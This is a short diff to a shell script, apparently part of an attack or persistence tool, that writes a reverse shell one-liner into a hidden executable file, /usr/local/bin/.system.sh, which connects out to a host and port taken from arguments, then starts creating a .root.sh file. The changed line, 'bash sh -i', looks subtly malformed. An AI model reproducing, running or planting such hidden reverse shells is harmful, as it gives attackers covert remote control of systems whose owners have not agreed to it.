@@ -25,7 +25,7 @@ sleep 1
 # CREATE FILES FOR SHELL REVERSE
 touch .system.sh
 echo "#\!/bin/bash" > /usr/local/bin/.system.sh
-echo "sh -i >& /dev/tcp/$1/$2 0>&1" >> /usr/local/bin/.system.sh
+echo "bash sh -i >& /dev/tcp/$1/$2 0>&1" >> /usr/local/bin/.system.sh
 sleep 1
 chmod +x /usr/local/bin/.system.sh
 touch .root.sh
